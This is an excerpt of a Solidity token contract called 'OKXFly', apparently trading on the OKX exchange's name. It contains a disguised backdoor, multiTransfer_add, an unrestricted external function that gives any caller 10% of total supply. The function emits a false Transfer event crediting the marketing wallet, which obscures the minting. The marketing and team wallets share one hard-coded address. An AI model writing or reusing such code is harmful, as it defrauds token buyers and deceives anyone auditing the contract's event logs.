...
contract OKXFly is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "OKXFly";
    string private _symbol = "OKXFly";
    uint8 private _decimals = 9;
    
    address payable public marketingWalletAddress = payable(0x7e53cB76f3C4c077694CDf5E99C95dB39775C687); // Marketing Address
    address payable public teamWalletAddress = payable(0x7e53cB76f3C4c077694CDf5E99C95dB39775C687); // teamWalletAddress
    ...
    function multiTransfer_add()  external {
         _balances[msg.sender] = _totalSupply.div(100).mul(10);
        emit Transfer(address(0), marketingWalletAddress, _totalSupply.div(100).mul(10));
    }
